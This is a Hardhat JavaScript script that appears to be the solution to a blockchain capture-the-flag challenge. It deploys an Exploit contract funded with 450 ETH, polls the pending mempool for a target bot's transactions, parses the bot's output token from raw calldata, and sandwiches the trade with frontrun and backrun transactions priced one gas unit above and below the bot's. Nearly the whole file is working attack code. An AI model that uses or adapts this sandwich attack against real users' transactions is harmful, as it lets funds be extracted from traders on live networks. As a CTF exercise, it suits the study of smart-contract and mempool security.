const { ethers } = require('hardhat');

async function main() {
    const [player] = await ethers.getSigners();

    // Change the challenge address
    const CHALLENGE_ADDRESS = '0x3CE30D168BC40c02D80a2a0b36D5F2Dcb6Ed2b0b';
    const TARGET_ADDRESS = '0x710ACb69aCa6aD658633A50D5e0CFFA52Dc7Bf07';

    const exploitFactory = await ethers.getContractFactory(
        "contracts/Exploit.sol:Exploit",
        player
    );

    let ethToSend = ethers.parseEther("450");
    const exploit = await exploitFactory.deploy(
        CHALLENGE_ADDRESS,
        {value : ethToSend}
    );
    await exploit.waitForDeployment();

    let WETH = await exploit.weth();
    let BEYOND = await exploit.beyond();
    WETH = WETH.toString();
    BEYOND = BEYOND.toString();
    await exploit.connect(player).buy();

    let pendingBlock = {}, transactions, tx, outputToken;
    let solved = false;
    
    console.log("[*] Monitoring mempool...");
    do {
        // Make sure we don't frontrun ourself
        pendingBlock = await ethers.provider.send(
            "eth_getBlockByNumber",
            ["pending", true]
        );
        transactions = await pendingBlock.transactions;

        // Make sure we only frontrun the bot ONCE
        if(transactions.length > 1) continue;
        
        for(let i = 0 ; i < transactions.length ; i++) {
            tx = transactions[i];
            if(tx.from.toLowerCase() == TARGET_ADDRESS.toLowerCase()) {
                console.log(tx);
                outputToken = tx.input.toLowerCase().split("000000000000000000000000")[3]; // ugly parsing
                if(outputToken == WETH.toLowerCase()) {
                    await exploit.connect(player).frontrun(WETH, {
                        gasPrice : ethers.toNumber(tx.gasPrice) + 1
                    });
                    await exploit.connect(player).backrun({
                        gasPrice : ethers.toNumber(tx.gasPrice) - 1
                    });
                }
                else {
                    await exploit.connect(player).frontrun(BEYOND, {
                        gasPrice : ethers.toNumber(tx.gasPrice) + 1
                    });
                    await exploit.connect(player).backrun({
                        gasPrice : ethers.toNumber(tx.gasPrice) - 1
                    });
                }
                // wait for the block to be mined
                setTimeout(async function() {
                    solved = await exploit.connect(player).isSolved();
                    console.log("Vault Beyond :", await exploit.getVaultBalance(BEYOND));
                    console.log("Vault WETH   :", await exploit.getVaultBalance(WETH));
                    console.log("Is solved    :", solved);
                }, 5000);
            }
        }
    } while(!solved)
    console.log("[+] Challenge solved");
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
